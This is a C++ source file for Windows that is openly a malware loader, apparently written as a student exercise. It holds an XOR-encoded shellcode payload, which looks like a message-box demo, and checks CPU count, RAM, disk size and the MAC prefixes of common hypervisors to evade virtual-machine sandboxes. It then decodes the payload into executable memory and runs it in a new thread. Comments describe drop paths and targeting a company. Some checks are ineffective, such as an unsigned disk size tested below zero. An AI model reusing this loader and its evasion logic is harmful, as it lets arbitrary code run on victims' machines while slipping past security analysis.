#include <stdio.h>

#include <windows.h>

#include <iphlpapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>

#pragma comment(lib, "psapi.lib")

unsigned char encoded_shellcode[] = "\x56\xe2\x2b\x4e\x5a\x55\x55\x55\x42\x7a\xaa\xaa\xaa\xeb\xfb\xeb\xfa\xf8\xfb\xfc\xe2\x9b\x78\xcf\xe2\x21\xf8\xca\x94\xe2\x21\xf8\xb2\x94\xe2\x21\xf8\x8a\x94\xe2\x21\xd8\xfa\x94\xe2\xa5\x1d\xe0\xe0\xe7\x9b\x63\xe2\x9b\x6a\x06\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab\x6b\x48\x47\xf8\xeb\xfb\x94\xe2\x21\xf8\x8a\x94\x21\xe8\x96\xe2\xab\x7a\x94\x21\x2a\x22\xaa\xaa\xaa\xe2\x2f\x6a\xde\xc5\xe2\xab\x7a\xfa\x94\x21\xe2\xb2\x94\xee\x21\xea\x8a\xe3\xab\x7a\x49\xf6\xe2\x55\x63\x94\xeb\x21\x9e\x22\xe2\xab\x7c\xe7\x9b\x63\xe2\x9b\x6a\x06\xeb\x6b\x63\xa7\xeb\xab\x6b\x92\x4a\xdf\x5b\x94\xe6\xa9\xe6\x8e\xa2\xef\x93\x7b\xdf\x7c\xf2\x94\xee\x21\xea\x8e\xe3\xab\x7a\xcc\x94\xeb\x21\xa6\xe2\x94\xee\x21\xea\xb6\xe3\xab\x7a\x94\xeb\x21\xae\x22\xe2\xab\x7a\xeb\xf2\xeb\xf2\xf4\xf3\xf0\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a\xeb\xf8\x55\x4a\xf2\xeb\xf3\xf0\x94\xe2\x21\xb8\x43\xe3\x55\x55\x55\xf7\x94\xe2\x27\x27\x93\xab\xaa\xaa\xeb\x10\xe6\xdd\x8c\xad\x55\x7f\xe3\x6d\x6b\xaa\xaa\xaa\xaa\x94\xe2\x27\x3f\xa4\xab\xaa\xaa\x94\xe6\x27\x2f\x84\xab\xaa\xaa\xe2\x9b\x63\xeb\x10\xef\x29\xfc\xad\x55\x7f\xe2\x9b\x63\xeb\x10\x5a\x1f\x08\xfc\x55\x7f\xe9\xc5\xc4\xc4\xcf\xc9\xde\xc3\xc4\xcd\x8a\xc7\xc3\xc4\xce\xd9\x86\x8a\xf9\xcf\xc9\xdf\xd8\xc3\xc4\xcd\x8a\xee\xcb\xde\xcb\xaa\xe7\xcf\xd9\xd9\xcb\xcd\xcf\xe8\xc5\xd2\xaa\xdf\xd9\xcf\xd8\x99\x98\x84\xce\xc6\xc6\xaa";
int shellcode_len = sizeof(encoded_shellcode);
unsigned char key = 0xAA;

int main() {
	DWORD thread_id;


	//Checking if the current environment is a VM
	// Checking CPU
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	if (sysinfo.dwNumberOfProcessors < 2) {
		return 0;
	}

	// Checking RAM
	MEMORYSTATUSEX MemoryStatex;
	MemoryStatex.dwLength = sizeof(MemoryStatex);
	GlobalMemoryStatusEx(&MemoryStatex);
	if (MemoryStatex.ullTotalPhys < 2483648) {
		return 0;
	}
	
	//Checking HDD
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DWORD diskSizeGB;

	HANDLE hDevice = CreateFile(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 0) {
		return 0;
	}
	

	//Checking mac address
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
	AdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(AdapterInfo);
		AdapterInfo = (IP_ADAPTER_INFO*)malloc(dwBufLen);
	}

	//Vmware
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		if (AdapterInfo->Address[0] == 0x00 && AdapterInfo->Address[1] == 0x05 && AdapterInfo->Address[2] == 0x69) {
			return 0;
		}
	}
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		if (AdapterInfo->Address[0] == 0x00 && AdapterInfo->Address[1] == 0x0C && AdapterInfo->Address[2] == 0x29) {
			return 0;
		}
	}

	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		if (AdapterInfo->Address[0] == 0x00 && AdapterInfo->Address[1] == 0x1C && AdapterInfo->Address[2] == 0x14) {
			return 0;
		}
	}

	
	//VirtualBox
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		if (AdapterInfo->Address[0] == 0x08 && AdapterInfo->Address[1] == 0x00 && AdapterInfo->Address[2] == 0x27) {
			return 0;
		}
	}
	
	//Microsoft Hyper-V
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		if (AdapterInfo->Address[0] == 0x00 && AdapterInfo->Address[1] == 0x15 && AdapterInfo->Address[2] == 0x5D) {
			return 0;
		}

	}

	//Parallels
	
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		if (AdapterInfo->Address[0] == 0x00 && AdapterInfo->Address[1] == 0x1C && AdapterInfo->Address[2] == 0x42) {
			return 0;
		}
	}

	//QEMU 

	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		if (AdapterInfo->Address[0] == 0x52 && AdapterInfo->Address[1] == 0x54 && AdapterInfo->Address[2] == 0x00) {
			return 0;
		}
	}


	free(AdapterInfo);



	//File , Path , process names

	//Can be used when you are sure about your malware's name , or where it should be dropped

	//wchar_t ProcessPath[MAX_PATH + 1];
	//GetModuleFileNameW(NULL, ProcessPath, MAX_PATH + 1);
	//CharUpperW(ProcessPath);
	//if (!wcsstr(ProcessPath, L"C:\\USERS\\PUBLIC\\")) return false;
	//if (!wcsstr(ProcessPath, L"MALWARE.EXE")) return false;


	
	//We can also check for Time Zone
	//If you are targeting a specified company
	//User Interaction 
	int response = MessageBoxW(NULL, L"Do you love ESTIN ?", L"Bayna kho ! ", MB_YESNOCANCEL);
	//if (response == IDYES) return false;


	//Running Processes

	DWORD runningProcessesIDs[1024];
	DWORD runningProcessesCountBytes;
	DWORD runningProcessesCount;
	//EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
	//runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
	//if (runningProcessesCount < 50) return false;


	void* exec = VirtualAlloc(0, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(exec, encoded_shellcode, shellcode_len);

	for (int i = 0; i < shellcode_len; i++) {
		((char*)exec)[i] ^= key;
	}

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, &thread_id);
	WaitForSingleObject(hThread, INFINITE);

	return 0;
}